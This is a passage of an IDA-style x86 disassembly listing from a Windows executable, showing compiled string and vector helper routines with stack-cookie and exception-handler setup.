loc_4096CD:                             ; CODE XREF: sub_409640+7D↑j
                pop     edi
                lea     eax, [esi+4]
                pop     ebp
                mov     byte ptr [eax], 0
                mov     eax, esi
                pop     ebx
                retn    8
; ---------------------------------------------------------------------------

loc_4096DB:                             ; CODE XREF: sub_409640+6C↑j
                add     ebp, 4

loc_4096DE:                             ; CODE XREF: sub_409640+71↑j
                mov     eax, [esi+18h]
                cmp     eax, 10h
                jb      short loc_4096EB
                mov     edx, [esi+4]
                jmp     short loc_4096EE
; ---------------------------------------------------------------------------

loc_4096EB:                             ; CODE XREF: sub_409640+A4↑j
                lea     edx, [esi+4]

loc_4096EE:                             ; CODE XREF: sub_409640+A9↑j
                mov     ecx, [esi+14h]
                push    ebx
                mov     ebx, [esp+10h+arg_4]
                add     ebp, ebx
                sub     eax, ecx
                push    ebp
                push    eax
                add     ecx, edx
                push    ecx
                call    sub_40F166
                add     esp, 10h
                cmp     dword ptr [esi+18h], 10h
                mov     [esi+14h], edi
                jb      short loc_40971F
                mov     eax, [esi+4]
                mov     byte ptr [eax+edi], 0
                pop     edi
                pop     ebp
                mov     eax, esi
                pop     ebx
                retn    8
; ---------------------------------------------------------------------------

loc_40971F:                             ; CODE XREF: sub_409640+CE↑j
                lea     eax, [esi+4]
                mov     byte ptr [eax+edi], 0

loc_409726:                             ; CODE XREF: sub_409640+3C↑j
                                        ; sub_409640:loc_4096A6↑j
                pop     edi
                pop     ebp
                mov     eax, esi
                pop     ebx
                retn    8
sub_409640      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_409730      proc near               ; CODE XREF: sub_401E10+433↑p
                                        ; sub_401E10+443↑p ...

arg_0           = dword ptr  4
arg_4           = dword ptr  8

                mov     ecx, [esp+arg_0]
                push    ebx
                push    ebp
                mov     ebp, [esp+8+arg_4]
                push    esi
                push    edi
                mov     esi, eax
                test    ecx, ecx
                jz      short loc_409784
                mov     edi, [esi+18h]
                lea     eax, [esi+4]
                cmp     edi, 10h
                jb      short loc_409751
                mov     edx, [eax]
                jmp     short loc_409753
; ---------------------------------------------------------------------------

loc_409751:                             ; CODE XREF: sub_409730+1B↑j
                mov     edx, eax

loc_409753:                             ; CODE XREF: sub_409730+1F↑j
                cmp     ecx, edx
                jb      short loc_409784
                cmp     edi, 10h
                jb      short loc_409760
                mov     edx, [eax]
                jmp     short loc_409762
; ---------------------------------------------------------------------------

loc_409760:                             ; CODE XREF: sub_409730+2A↑j
                mov     edx, eax

loc_409762:                             ; CODE XREF: sub_409730+2E↑j
                mov     ebx, [esi+14h]
                add     ebx, edx
                cmp     ebx, ecx
                jbe     short loc_409784
                cmp     edi, 10h
                jb      short loc_409772
                mov     eax, [eax]

loc_409772:                             ; CODE XREF: sub_409730+3E↑j
                sub     ecx, eax
                push    ecx
                push    esi
                mov     eax, ebp
                call    sub_409640
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                retn    8
; ---------------------------------------------------------------------------

loc_409784:                             ; CODE XREF: sub_409730+10↑j
                                        ; sub_409730+25↑j ...
                mov     eax, [esi+14h]
                or      ecx, 0FFFFFFFFh
                sub     ecx, eax
                cmp     ecx, ebp
                jbe     short loc_409797
                lea     edx, [eax+ebp]
                cmp     edx, eax
                jnb     short loc_40979C

loc_409797:                             ; CODE XREF: sub_409730+5E↑j
                call    sub_40E26B
; ---------------------------------------------------------------------------

loc_40979C:                             ; CODE XREF: sub_409730+65↑j
                test    ebp, ebp
                jbe     loc_40982B
                mov     edi, [esi+14h]
                add     edi, ebp
                cmp     edi, 0FFFFFFFEh
                jbe     short loc_4097B3
                call    sub_40E26B
; ---------------------------------------------------------------------------

loc_4097B3:                             ; CODE XREF: sub_409730+7C↑j
                mov     eax, [esi+18h]
                cmp     eax, edi
                jnb     short loc_4097D9
                mov     eax, [esi+14h]
                push    eax
                push    edi
                mov     ecx, esi
                call    sub_40A7D0
                test    edi, edi

loc_4097C8:                             ; CODE XREF: sub_409730+AB↓j
                jbe     short loc_40982B
                mov     eax, [esi+18h]
                lea     ebx, [esi+4]
                cmp     eax, 10h
                jb      short loc_409803
                mov     edx, [ebx]
                jmp     short loc_409805
; ---------------------------------------------------------------------------

loc_4097D9:                             ; CODE XREF: sub_409730+88↑j
                test    edi, edi
                jnz     short loc_4097C8
                mov     [esi+14h], edi
                cmp     eax, 10h
                jb      short loc_4097F4
                mov     eax, [esi+4]
                pop     edi
                mov     byte ptr [eax], 0
                mov     eax, esi
                pop     esi
                pop     ebp
                pop     ebx
                retn    8
; ---------------------------------------------------------------------------

loc_4097F4:                             ; CODE XREF: sub_409730+B3↑j
                lea     eax, [esi+4]
                pop     edi
                mov     byte ptr [eax], 0
                mov     eax, esi
                pop     esi
                pop     ebp
                pop     ebx
                retn    8
; ---------------------------------------------------------------------------

loc_409803:                             ; CODE XREF: sub_409730+A3↑j
                mov     edx, ebx

loc_409805:                             ; CODE XREF: sub_409730+A7↑j
                mov     ecx, [esi+14h]
                push    ebp
                mov     ebp, [esp+14h+arg_0]
                sub     eax, ecx
                push    ebp
                push    eax
                add     ecx, edx
                push    ecx
                call    sub_40F166
                add     esp, 10h
                cmp     dword ptr [esi+18h], 10h
                mov     [esi+14h], edi
                jb      short loc_409827
                mov     ebx, [ebx]

loc_409827:                             ; CODE XREF: sub_409730+F3↑j
                mov     byte ptr [ebx+edi], 0

loc_40982B:                             ; CODE XREF: sub_409730+6E↑j
                                        ; sub_409730:loc_4097C8↑j
                pop     edi
                mov     eax, esi
                pop     esi
                pop     ebp
                pop     ebx
                retn    8
sub_409730      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_409840      proc near               ; CODE XREF: sub_401E10+3C3↑p
                                        ; sub_4027B0+6B↑p ...

arg_0           = dword ptr  4
arg_4           = dword ptr  8

                push    ebp
                mov     ebp, [esp+4+arg_0]
                push    esi
                push    edi
                mov     esi, ecx
                test    ebp, ebp
                jz      short loc_409893
                mov     edx, [esi+18h]
                lea     eax, [esi+4]
                cmp     edx, 10h
                jb      short loc_40985C
                mov     ecx, [eax]
                jmp     short loc_40985E
; ---------------------------------------------------------------------------

loc_40985C:                             ; CODE XREF: sub_409840+16↑j
                mov     ecx, eax

loc_40985E:                             ; CODE XREF: sub_409840+1A↑j
                cmp     ebp, ecx
                jb      short loc_409893
                cmp     edx, 10h
                jb      short loc_40986B
                mov     ecx, [eax]
                jmp     short loc_40986D
; ---------------------------------------------------------------------------

loc_40986B:                             ; CODE XREF: sub_409840+25↑j
                mov     ecx, eax

loc_40986D:                             ; CODE XREF: sub_409840+29↑j
                mov     edi, [esi+14h]
                add     edi, ecx
                cmp     edi, ebp
                jbe     short loc_409893
                cmp     edx, 10h
                jb      short loc_40987D
                mov     eax, [eax]

loc_40987D:                             ; CODE XREF: sub_409840+39↑j
                mov     ecx, [esp+0Ch+arg_4]
                push    ecx
                sub     ebp, eax
                push    ebp
                push    esi
                mov     ecx, esi
                call    sub_408CA0
                pop     edi
                pop     esi
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_409893:                             ; CODE XREF: sub_409840+B↑j
                                        ; sub_409840+20↑j ...
                mov     edi, [esp+0Ch+arg_4]
                cmp     edi, 0FFFFFFFEh
                jbe     short loc_4098A1
                call    sub_40E26B
; ---------------------------------------------------------------------------

loc_4098A1:                             ; CODE XREF: sub_409840+5A↑j
                mov     eax, [esi+18h]
                cmp     eax, edi
                jnb     short loc_4098C8
                mov     edx, [esi+14h]
                push    edx
                push    edi
                mov     ecx, esi
                call    sub_40A7D0
                test    edi, edi

loc_4098B6:                             ; CODE XREF: sub_409840+8A↓j
                jbe     short loc_40990E
                mov     ecx, [esi+18h]
                push    ebx
                lea     ebx, [esi+4]
                cmp     ecx, 10h
                jb      short loc_4098F0
                mov     eax, [ebx]
                jmp     short loc_4098F2
; ---------------------------------------------------------------------------

loc_4098C8:                             ; CODE XREF: sub_409840+66↑j
                test    edi, edi
                jnz     short loc_4098B6
                mov     [esi+14h], edi
                cmp     eax, 10h
                jb      short loc_4098E2
                mov     eax, [esi+4]
                pop     edi
                mov     byte ptr [eax], 0
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_4098E2:                             ; CODE XREF: sub_409840+92↑j
                lea     eax, [esi+4]
                pop     edi
                mov     byte ptr [eax], 0
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_4098F0:                             ; CODE XREF: sub_409840+82↑j
                mov     eax, ebx

loc_4098F2:                             ; CODE XREF: sub_409840+86↑j
                push    edi
                push    ebp
                push    ecx
                push    eax
                call    sub_40F166
                add     esp, 10h
                cmp     dword ptr [esi+18h], 10h
                mov     [esi+14h], edi
                jb      short loc_409909
                mov     ebx, [ebx]

loc_409909:                             ; CODE XREF: sub_409840+C5↑j
                mov     byte ptr [ebx+edi], 0
                pop     ebx

loc_40990E:                             ; CODE XREF: sub_409840:loc_4098B6↑j
                pop     edi
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    8
sub_409840      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_409920      proc near               ; CODE XREF: sub_408CA0+32↑p
                                        ; sub_408CA0+3C↑p

arg_0           = dword ptr  4
arg_4           = dword ptr  8

                push    ebx
                mov     ebx, [esp+4+arg_0]
                push    esi
                mov     esi, ecx
                push    edi
                cmp     [esi+14h], ebx
                jnb     short loc_409933
                call    sub_40E2A3
; ---------------------------------------------------------------------------

loc_409933:                             ; CODE XREF: sub_409920+C↑j
                mov     eax, [esi+14h]
                mov     edi, [esp+0Ch+arg_4]
                sub     eax, ebx
                cmp     eax, edi
                jnb     short loc_409942
                mov     edi, eax

loc_409942:                             ; CODE XREF: sub_409920+1E↑j
                test    edi, edi
                jbe     short loc_40999B
                mov     ecx, [esi+18h]
                push    ebp
                lea     ebp, [esi+4]
                cmp     ecx, 10h
                jb      short loc_40995B
                mov     edx, [ebp+0]
                mov     [esp+10h+arg_0], edx
                jmp     short loc_40995F
; ---------------------------------------------------------------------------

loc_40995B:                             ; CODE XREF: sub_409920+30↑j
                mov     [esp+10h+arg_0], ebp

loc_40995F:                             ; CODE XREF: sub_409920+39↑j
                cmp     ecx, 10h
                jb      short loc_409969
                mov     edx, [ebp+0]
                jmp     short loc_40996B
; ---------------------------------------------------------------------------

loc_409969:                             ; CODE XREF: sub_409920+42↑j
                mov     edx, ebp

loc_40996B:                             ; CODE XREF: sub_409920+47↑j
                sub     eax, edi
                push    eax
                mov     eax, [esp+14h+arg_0]
                add     eax, ebx
                add     eax, edi
                push    eax
                sub     ecx, ebx
                push    ecx
                add     edx, ebx
                push    edx
                call    sub_40E31F
                mov     eax, [esi+14h]
                sub     eax, edi
                add     esp, 10h
                cmp     dword ptr [esi+18h], 10h
                mov     [esi+14h], eax
                jb      short loc_409996
                mov     ebp, [ebp+0]

loc_409996:                             ; CODE XREF: sub_409920+71↑j
                mov     byte ptr [eax+ebp], 0
                pop     ebp

loc_40999B:                             ; CODE XREF: sub_409920+24↑j
                pop     edi
                mov     eax, esi
                pop     esi
                pop     ebx
                retn    8
sub_409920      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4099B0      proc near               ; CODE XREF: sub_4099D0+1DA↓p
                                        ; sub_4099D0+1F1↓p ...

arg_0           = dword ptr  4

                mov     eax, [esp+arg_0]
                push    eax
                mov     eax, [esp+4+arg_0]
                push    ecx
                call    sub_40B180
                add     esp, 8
                retn    4
sub_4099B0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4099D0      proc near               ; CODE XREF: sub_408E50+72↑p

var_54          = byte ptr -54h
var_3C          = byte ptr -3Ch
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_8           = dword ptr  10h

                push    ebp
                mov     ebp, esp
                push    0FFFFFFFFh
                push    offset SEH_4099D0
                mov     eax, large fs:0
                push    eax
                sub     esp, 48h
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_C]
                mov     large fs:0, eax
                mov     [ebp+var_10], esp
                mov     ebx, dword_42C8BC
                test    ebx, ebx
                jnz     short loc_409A09
                xor     edi, edi
                jmp     short loc_409A22
; ---------------------------------------------------------------------------

loc_409A09:                             ; CODE XREF: sub_4099D0+33↑j
                mov     ecx, dword_42C8C4
                sub     ecx, ebx
                mov     eax, 2AAAAAABh
                imul    ecx
                sar     edx, 2
                mov     edi, edx
                shr     edi, 1Fh
                add     edi, edx

loc_409A22:                             ; CODE XREF: sub_4099D0+37↑j
                mov     esi, dword_42C8C0
                mov     ecx, esi
                sub     ecx, ebx
                mov     eax, 2AAAAAABh
                imul    ecx
                sar     edx, 2
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                mov     ecx, 0AAAAAAAh
                sub     ecx, eax
                cmp     ecx, 1
                jnb     short loc_409A4E
                call    sub_409D40
; ---------------------------------------------------------------------------

loc_409A4E:                             ; CODE XREF: sub_4099D0+77↑j
                inc     eax
                cmp     edi, eax
                jnb     loc_409BD8
                mov     ecx, edi
                shr     ecx, 1
                mov     edx, 0AAAAAAAh
                sub     edx, ecx
                cmp     edx, edi
                jnb     short loc_409A6A
                xor     edi, edi
                jmp     short loc_409A6C
; ---------------------------------------------------------------------------

loc_409A6A:                             ; CODE XREF: sub_4099D0+94↑j
                add     edi, ecx

loc_409A6C:                             ; CODE XREF: sub_4099D0+98↑j
                cmp     edi, eax
                jnb     short loc_409A72
                mov     edi, eax

loc_409A72:                             ; CODE XREF: sub_4099D0+9E↑j
                mov     ecx, edi
                call    sub_409DC0
                mov     ecx, [ebp+arg_8]
                sub     ecx, dword_42C8BC
                mov     ebx, eax
                mov     eax, 2AAAAAABh
                imul    ecx
                sar     edx, 2
                xor     eax, eax
                mov     [ebp+var_4], eax
                mov     esi, edx
                shr     esi, 1Fh
                add     esi, edx
                mov     edx, [ebp+arg_0]
                mov     byte ptr [ebp+var_24], 0
                mov     ecx, [ebp+var_24]
                push    ecx
                mov     ecx, [ebp+arg_0]
                mov     [ebp+var_18], eax
                push    edx
                lea     eax, [esi+esi*2]
                push    ecx
                lea     eax, [ebx+eax*8]
                push    eax
                mov     ecx, 1
                mov     [ebp+var_1C], ebx
                mov     [ebp+var_20], esi
                call    sub_40B050
                mov     ecx, [ebp+arg_8]
                add     esp, 10h
                mov     byte ptr [ebp+arg_0], 0
                mov     edx, [ebp+arg_0]
                mov     eax, [ebp+arg_0]
                push    edx
                push    eax
                push    ebx
                push    ecx
                mov     ecx, dword_42C8BC
                mov     [ebp+var_18], 1
                call    sub_40B580
                add     esp, 10h
                lea     edx, [esi+esi*2+3]
                lea     eax, [ebx+edx*8]
                mov     byte ptr [ebp+arg_0], 0
                mov     ecx, [ebp+arg_0]
                mov     edx, [ebp+arg_0]
                push    ecx
                mov     ecx, [ebp+arg_8]
                push    edx
                push    eax
                mov     eax, dword_42C8C0
                push    eax
                mov     [ebp+var_18], 2
                call    sub_40B580
                mov     esi, dword_42C8BC
                mov     ecx, dword_42C8C0
                sub     ecx, esi
                mov     eax, 2AAAAAABh
                imul    ecx
                sar     edx, 2
                mov     ecx, edx
                shr     ecx, 1Fh
                add     esp, 10h
                lea     edx, [edx+ecx+1]
                mov     [ebp+arg_0], edx
                test    esi, esi
                jz      short loc_409B64
                mov     edx, [ebp+arg_0]
                mov     eax, dword_42C8C0
                push    edx
                push    eax
                mov     eax, esi
                call    sub_40B180
                mov     ecx, dword_42C8BC
                push    ecx
                call    sub_40F15B
                mov     edx, [ebp+arg_0]
                add     esp, 0Ch

loc_409B64:                             ; CODE XREF: sub_4099D0+16F↑j
                lea     eax, [edi+edi*2]
                lea     ecx, [ebx+eax*8]
                lea     edx, [edx+edx*2]
                lea     eax, [ebx+edx*8]
                mov     dword_42C8C4, ecx
                mov     dword_42C8C0, eax
                mov     dword_42C8BC, ebx
                mov     ecx, [ebp+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_409B95:                             ; DATA XREF: .rdata:stru_423F0C↓o
                mov     ebx, [ebp+var_18]
                cmp     ebx, 1
                mov     esi, [ebp+var_20]
                mov     edi, [ebp+var_1C]
                jle     short loc_409BAF
                lea     ecx, [esi+esi*2]
                lea     ecx, [edi+ecx*8]
                push    edi
                call    sub_4099B0

loc_409BAF:                             ; CODE XREF: sub_4099D0+1D1↑j
                test    ebx, ebx
                jle     short loc_409BC6
                lea     edx, [esi+esi*2+3]
                lea     eax, [esi+esi*2]
                lea     ecx, [edi+edx*8]
                lea     edx, [edi+eax*8]
                push    edx
                call    sub_4099B0

loc_409BC6:                             ; CODE XREF: sub_4099D0+1E1↑j
                push    edi
                call    sub_40F15B
                add     esp, 4
                push    0
                push    0
                call    sub_41032B

loc_409BD8:                             ; CODE XREF: sub_4099D0+81↑j
                sub     esi, [ebp+arg_8]
                mov     eax, 2AAAAAABh
                imul    esi
                sar     edx, 2
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                cmp     eax, 1
                jnb     loc_409CB7
                lea     ecx, [ebp+var_3C]
                push    ecx
                mov     ecx, [ebp+arg_0]
                call    sub_408740
                mov     edi, 2
                mov     [ebp+var_4], edi
                mov     ecx, [ebp+arg_8]
                mov     byte ptr [ebp+arg_0], 0
                mov     edx, [ebp+arg_0]
                push    edx
                mov     edx, [ebp+arg_0]
                lea     eax, [ecx+18h]
                push    edx
                push    eax
                mov     eax, dword_42C8C0
                push    eax
                call    sub_40B580
                mov     byte ptr [ebp+var_4], 3
                mov     esi, dword_42C8C0
                mov     ecx, esi
                sub     ecx, [ebp+arg_8]
                mov     eax, 2AAAAAABh
                imul    ecx
                sar     edx, 2
                mov     ecx, edx
                shr     ecx, 1Fh
                add     edx, ecx
                mov     byte ptr [ebp+arg_0], 0
                mov     eax, [ebp+arg_0]
                push    eax
                mov     ecx, 1
                sub     ecx, edx
                mov     edx, [ebp+arg_0]
                push    edx
                lea     eax, [ebp+var_3C]
                push    eax
                push    esi
                call    sub_40B050
                mov     [ebp+var_4], edi
                mov     eax, dword_42C8C0
                mov     esi, [ebp+arg_8]
                add     eax, 18h
                lea     edi, [eax-18h]
                add     esp, 20h
                mov     dword_42C8C0, eax
                cmp     esi, edi
                jz      short loc_409C91

loc_409C81:                             ; CODE XREF: sub_4099D0+2BF↓j
                push    esi
                lea     eax, [ebp+var_3C]
                call    sub_40B290
                add     esi, 18h
                cmp     esi, edi
                jnz     short loc_409C81

loc_409C91:                             ; CODE XREF: sub_4099D0+2AF↑j
                lea     esi, [ebp+var_3C]
                jmp     loc_409D18
; ---------------------------------------------------------------------------

loc_409C99:                             ; DATA XREF: .rdata:stru_423F1C↓o
                mov     edx, [ebp+arg_8]
                mov     ecx, dword_42C8C0
                add     edx, 18h
                add     ecx, 18h
                push    edx
                call    sub_4099B0
                push    0
                push    0
                call    sub_41032B

loc_409CB7:                             ; CODE XREF: sub_4099D0+21F↑j
                mov     ecx, [ebp+arg_0]
                lea     eax, [ebp+var_54]
                push    eax
                call    sub_408740
                mov     [ebp+var_4], 5
                mov     esi, dword_42C8C0
                mov     byte ptr [ebp+arg_0], 0
                mov     ecx, [ebp+arg_0]
                mov     edx, [ebp+arg_0]
                push    ecx
                push    edx
                lea     edi, [esi-18h]
                push    esi
                push    esi
                mov     ecx, edi
                call    sub_40B580
                mov     dword_42C8C0, eax
                mov     eax, edi
                mov     edi, [ebp+arg_8]
                push    esi
                call    sub_40AF70
                mov     esi, [ebp+arg_8]
                lea     edi, [esi+18h]
                add     esp, 14h
                cmp     esi, edi
                jz      short loc_409D15

loc_409D05:                             ; CODE XREF: sub_4099D0+343↓j
                push    esi
                lea     eax, [ebp+var_54]
                call    sub_40B290
                add     esi, 18h
                cmp     esi, edi
                jnz     short loc_409D05

loc_409D15:                             ; CODE XREF: sub_4099D0+333↑j
                lea     esi, [ebp+var_54]

loc_409D18:                             ; CODE XREF: sub_4099D0+2C4↑j
                call    sub_40B240
                mov     ecx, [ebp+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    0Ch
sub_4099D0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame fuzzy-sp

sub_409D40      proc near               ; CODE XREF: sub_4099D0+79↑p

var_54          = byte ptr -54h
var_50          = byte ptr -50h
var_40          = dword ptr -40h
var_3C          = dword ptr -3Ch
var_38          = dword ptr -38h
var_C           = byte ptr -0Ch
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                and     esp, 0FFFFFFF8h
                push    0FFFFFFFFh
                push    offset SEH_40A940
                mov     eax, large fs:0
                push    eax
                sub     esp, 4Ch
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+5Ch+var_C]
                mov     large fs:0, eax
                push    12h
                push    offset aVectorTTooLong ; "vector<T> too long"
                lea     ecx, [esp+64h+var_54]
                mov     [esp+64h+var_3C], 0Fh
                mov     [esp+64h+var_40], 0
                mov     [esp+64h+var_50], 0
                call    sub_409840
                lea     eax, [esp+5Ch+var_54]
                push    eax
                lea     ecx, [esp+60h+var_38]
                mov     [esp+60h+var_4], 0
                call    sub_4010D0
                push    offset unk_423344
                lea     ecx, [esp+60h+var_38]
                push    ecx
                mov     [esp+64h+var_38], offset off_420278
                call    sub_41032B
sub_409D40      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_409DC0      proc near               ; CODE XREF: sub_4099D0+A4↑p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch

                sub     esp, 10h
                test    ecx, ecx
                ja      short loc_409DDF
                xor     ecx, ecx

loc_409DC9:                             ; CODE XREF: sub_409DC0+29↓j
                lea     edx, [ecx+ecx*2]
                add     edx, edx
                add     edx, edx
                add     edx, edx
                push    edx
                call    sub_40F94F
                add     esp, 4
                add     esp, 10h
                retn
; ---------------------------------------------------------------------------

loc_409DDF:                             ; CODE XREF: sub_409DC0+5↑j
                or      eax, 0FFFFFFFFh
                xor     edx, edx
                div     ecx
                cmp     eax, 18h
                jnb     short loc_409DC9
                lea     eax, [esp+10h+var_10]
                push    eax
                lea     ecx, [esp+14h+var_C]
                mov     [esp+14h+var_10], 0
                call    sub_40E649
                push    offset unk_42337C
                lea     ecx, [esp+14h+var_C]
                push    ecx
                mov     [esp+18h+var_C], offset off_420260
                call    sub_41032B
sub_409DC0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_409E20      proc near               ; CODE XREF: sub_408F30+33↑p

var_8           = dword ptr -8
var_4           = dword ptr -4

                sub     esp, 8
                mov     ecx, dword_42C8DC
                push    ebx
                push    ebp
                mov     eax, 9249249h
                mov     edx, 1
                sub     eax, ecx
                push    esi
                push    edi
                mov     [esp+18h+var_8], edx
                cmp     eax, edx
                jnb     short loc_409E46
                call    sub_40A940
; ---------------------------------------------------------------------------

loc_409E46:                             ; CODE XREF: sub_409E20+1F↑j
                mov     eax, ecx
                shr     eax, 1
                cmp     eax, 8
                jnb     short loc_409E56
                mov     eax, 8
                jmp     short loc_409E5B
; ---------------------------------------------------------------------------

loc_409E56:                             ; CODE XREF: sub_409E20+2D↑j
                cmp     eax, 1
                jbe     short loc_409E6C

loc_409E5B:                             ; CODE XREF: sub_409E20+34↑j
                mov     esi, 9249249h
                sub     esi, eax
                cmp     ecx, esi
                ja      short loc_409E6C
                mov     edx, eax
                mov     [esp+18h+var_8], eax

loc_409E6C:                             ; CODE XREF: sub_409E20+39↑j
                                        ; sub_409E20+44↑j
                mov     ebx, dword_42C8E0
                add     ecx, edx
                call    sub_40A9C0
                mov     ecx, dword_42C8D8
                mov     [esp+18h+var_4], eax
                lea     esi, ds:0[ebx*4]
                lea     edi, [esi+eax]
                mov     eax, dword_42C8DC
                add     eax, eax
                add     eax, eax
                lea     edx, [esi+ecx]
                sub     eax, edx
                add     eax, ecx
                sar     eax, 2
                lea     ecx, ds:0[eax*4]
                lea     ebp, [ecx+edi]
                test    eax, eax
                jbe     short loc_409EBA
                push    ecx
                push    edx
                push    ecx
                push    edi
                call    sub_40E31F
                add     esp, 10h

loc_409EBA:                             ; CODE XREF: sub_409E20+8C↑j
                mov     eax, [esp+18h+var_8]
                cmp     ebx, eax
                ja      short loc_409F03
                sar     esi, 2
                lea     eax, ds:0[esi*4]
                lea     edi, [eax+ebp]
                test    esi, esi
                jbe     short loc_409EE5
                mov     ecx, dword_42C8D8
                push    eax
                push    ecx
                push    eax
                push    ebp
                call    sub_40E31F
                add     esp, 10h

loc_409EE5:                             ; CODE XREF: sub_409E20+B1↑j
                mov     ecx, [esp+18h+var_8]
                sub     ecx, ebx
                jz      short loc_409EF1
                xor     eax, eax
                rep stosd

loc_409EF1:                             ; CODE XREF: sub_409E20+CB↑j
                test    ebx, ebx
                jbe     short loc_409F66
                mov     ecx, ebx
                mov     ebx, [esp+18h+var_4]
                xor     eax, eax
                mov     edi, ebx
                rep stosd
                jmp     short loc_409F6A
; ---------------------------------------------------------------------------

loc_409F03:                             ; CODE XREF: sub_409E20+A0↑j
                lea     ebx, ds:0[eax*4]
                mov     eax, ebx
                sar     eax, 2
                test    eax, eax
                jbe     short loc_409F29
                mov     edx, dword_42C8D8
                add     eax, eax
                add     eax, eax
                push    eax
                push    edx
                push    eax
                push    ebp
                call    sub_40E31F
                add     esp, 10h

loc_409F29:                             ; CODE XREF: sub_409E20+F1↑j
                mov     eax, dword_42C8D8
                lea     ecx, [ebx+eax]
                mov     ebx, [esp+18h+var_4]
                sub     esi, ecx
                add     esi, eax
                sar     esi, 2
                lea     eax, ds:0[esi*4]
                lea     ebp, [eax+ebx]
                test    esi, esi
                jbe     short loc_409F56
                push    eax
                push    ecx
                push    eax
                push    ebx
                call    sub_40E31F
                add     esp, 10h

loc_409F56:                             ; CODE XREF: sub_409E20+128↑j
                mov     ecx, [esp+18h+var_8]
                test    ecx, ecx
                jbe     short loc_409F6A
                xor     eax, eax
                mov     edi, ebp
                rep stosd
                jmp     short loc_409F6A
; ---------------------------------------------------------------------------

loc_409F66:                             ; CODE XREF: sub_409E20+D3↑j
                mov     ebx, [esp+18h+var_4]

loc_409F6A:                             ; CODE XREF: sub_409E20+E1↑j
                                        ; sub_409E20+13C↑j ...
                mov     eax, dword_42C8D8
                test    eax, eax
                jz      short loc_409F7C
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_409F7C:                             ; CODE XREF: sub_409E20+151↑j
                mov     eax, [esp+18h+var_8]
                add     dword_42C8DC, eax
                pop     edi
                pop     esi
                pop     ebp
                mov     dword_42C8D8, ebx
                pop     ebx
                add     esp, 8
                retn
sub_409E20      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_409FA0      proc near               ; CODE XREF: sub_408740+85↑p
                                        ; sub_409180+10↑p ...

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch

                sub     esp, 10h
                test    ecx, ecx
                ja      short loc_409FC3
                xor     ecx, ecx

loc_409FA9:                             ; CODE XREF: sub_409FA0+2D↓j
                lea     edx, ds:0[ecx*8]
                sub     edx, ecx
                add     edx, edx
                add     edx, edx
                push    edx
                call    sub_40F94F
                add     esp, 4
                add     esp, 10h
                retn
; ---------------------------------------------------------------------------

loc_409FC3:                             ; CODE XREF: sub_409FA0+5↑j
                or      eax, 0FFFFFFFFh
                xor     edx, edx
                div     ecx
                cmp     eax, 1Ch
                jnb     short loc_409FA9
                lea     eax, [esp+10h+var_10]
                push    eax
                lea     ecx, [esp+14h+var_C]
                mov     [esp+14h+var_10], 0
                call    sub_40E649
                push    offset unk_42337C
                lea     ecx, [esp+14h+var_C]
                push    ecx
                mov     [esp+18h+var_C], offset off_420260
                call    sub_41032B
sub_409FA0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40A000      proc near               ; CODE XREF: sub_40B0E0:loc_40B155↓p
                                        ; sub_40B4E0:loc_40B555↓p ...
                cmp     dword ptr [esi+18h], 10h
                jb      short loc_40A012
                mov     eax, [esi+4]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_40A012:                             ; CODE XREF: sub_40A000+4↑j
                xor     eax, eax
                mov     dword ptr [esi+18h], 0Fh
                mov     [esi+14h], eax
                mov     [esi+4], al
                retn
sub_40A000      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40A030      proc near               ; CODE XREF: sub_4090A0+72↑p

var_60          = dword ptr -60h
var_5C          = dword ptr -5Ch
var_58          = dword ptr -58h
var_54          = dword ptr -54h
var_50          = dword ptr -50h
var_4C          = byte ptr -4Ch
var_30          = byte ptr -30h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_8           = dword ptr  10h

                push    ebp
                mov     ebp, esp
                push    0FFFFFFFFh
                push    offset SEH_40A030
                mov     eax, large fs:0
                push    eax
                sub     esp, 58h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_14], eax
                push    ebx
                push    esi
                push    edi
                push    eax
                lea     eax, [ebp+var_C]
                mov     large fs:0, eax
